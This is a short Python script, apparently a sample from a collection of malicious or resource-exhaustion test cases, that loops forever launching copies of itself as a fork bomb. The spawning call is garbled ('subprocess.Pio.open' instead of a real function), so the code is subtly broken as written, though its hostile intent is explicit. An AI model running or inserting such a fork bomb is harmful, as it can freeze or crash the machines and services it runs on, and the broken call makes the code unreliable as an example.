#!/usr/bin/env python3

"""Resource exhaustion - resource_exhaustion"""
import subprocess

# Fork bomb
while True:
    subprocess.Pio.open(["python3", __file__])
